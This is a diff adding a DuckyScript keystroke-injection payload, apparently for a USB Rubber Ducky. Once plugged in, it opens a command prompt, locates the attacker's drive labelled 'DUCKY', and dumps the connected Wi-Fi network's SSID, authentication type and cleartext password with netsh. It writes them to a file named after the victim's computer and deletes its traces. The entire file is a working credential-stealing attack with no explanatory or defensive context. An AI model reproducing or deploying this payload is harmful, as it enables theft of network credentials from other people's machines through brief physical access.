@@ -1,0 +1,19 @@
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 1000
+STRING for /f %d in ('wmic volume get driveletter^, label ^| findstr "DUCKY"') do set duck=%d
+ENTER
+STRING %duck% & for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
+ENTER
+STRING netsh wlan show profiles %A% key=clear | findstr /c:"Network type" /c:"Authentication" /c:"Key Content" | findstr /v "broadcast" | findstr /v "Radio">>temp.txt
+ENTER
+STRING for /f "tokens=3 delims=: " %A in ('findstr "Network type" temp.txt') do set B=%A & for /f "tokens=2 delims=: " %A in ('findstr "Authentication" temp.txt') do set C=%A & for /f "tokens=3 delims=: " %A in ('findstr "Key Content" temp.txt') do set D=%A
+ENTER
+STRING del temp.txt
+ENTER
+STRING echo SSID: %A%>>%computername%-wifi.txt & echo Network type: %B%>>%computername%-wifi.txt & echo Authentication: %C%>>%computername%-wifi.txt & echo Password: %D%>>%computername%-wifi.txt
+ENTER
+STRING exit
+ENTER
